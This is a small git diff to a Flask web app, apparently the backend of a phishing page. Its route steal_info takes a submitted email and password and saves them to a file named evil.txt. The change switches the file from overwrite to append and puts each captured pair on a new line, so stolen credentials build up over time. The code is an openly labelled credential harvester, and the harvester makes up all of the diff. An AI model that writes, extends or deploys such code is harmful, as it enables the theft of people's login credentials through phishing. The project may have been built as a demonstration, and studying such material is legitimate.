@@ -1,5 +1,6 @@
-from flask import Flask, jsonify, request
+from flask import Flask, jsonify, request, redirect
 from flask_cors import CORS
+from bs4 import BeautifulSoup as bs
 
 #instantiate the app
 app = Flask(__name__)
@@ -54,9 +55,9 @@ def steal_info():
     password = post_data.get("password")
 
     # Open the file to write the email and password
-    file = open("evil.txt", "w")
+    file = open("evil.txt", "a")
 
-    evil_data = email + " : " + password
+    evil_data = "\n" + email + " : " + password
     file.write(evil_data)
 
     file.close()
